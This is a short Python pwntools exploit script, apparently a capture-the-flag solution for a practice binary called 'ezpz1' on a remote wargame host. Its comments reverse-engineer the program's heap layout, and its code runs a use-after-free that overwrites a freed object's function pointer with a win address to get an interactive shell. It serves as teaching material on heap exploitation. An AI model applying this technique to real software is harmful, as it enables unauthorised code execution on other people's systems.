#!/usr/bin/python3

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

from pwn import *

# p = process("./ezpz1")
p = remote("plsdonthaq.me", 7001)

winAddr = 0x8048a5c

wait = lambda: p.recvuntil("Enter your choice, (or press enter to refresh): ")

'''
:: get_question
Condition: 0 <= atoi < *number_questions
fgets(&var14, 4, stdin)
returns start of malloc

:: delete_question
eax = get_question()
free(eax)
free(*(eax + 0x18)

:: create_question
Condition: *number_questions > 0x1f (31)
eax2 = malloc(0x1c) (28)
*(eax2+0x18) = malloc(0x18)
memset(*(eax2+0x18), 0, 18)
*eax2 = print_question

                                            Bytes 0  - 3     |-----> print_question
                                            Bytes 4  - 7     |    |
                                            Bytes 8  - 11    |    |
                                            Bytes 12 - 15    |    |
                                            Bytes 16 - 19    |  ==|--> 0x18 (24) byte buffer
                                            Bytes 20 - 23    |==  |
                                            Bytes 24 - 27    |    |

nQuestions += 1
array[nQuestions] <---- eax2


:: set_question
fgets(*(eax+0x18), 0x18, stdin)



:: print_question(space)
printf("%s", *(space+0x18))

:: ask_question
get question space
*question === *questionspace[0] === print_question

print_question(question)
'''


def create():
    p.sendline("C")
    wait()

def delete(id):
    p.sendline("D")
    p.sendline(str(id))
    wait()

def set(id, str_0x18):
    p.sendline("S")
    p.sendline(str(id))
    p.sendline(str_0x18)
    wait()

def ask(id):
    p.sendline("A")
    p.sendline(str(id))
    # wait()

wait()

######

create()  # Create question 0 (malloc container0, malloc buffer0)
delete(0) # Delete question 0 (free container0, free buffer0)
'''
    The free list is now
    HEAD:[buffer0]->[container0]
'''

create() # Create question 1 (malloc container1, malloc buffer1)
'''
    Question 1 uses [buffer0] as the container, and [container1] as the buffer
'''

set(1, p32(winAddr)) # Set *[buffer1] to the win address
'''
    But, [buffer1] == [container0]
    So we're setting *[container0] to the win address
'''

ask(0) # Call *[container0]
p.interactive()


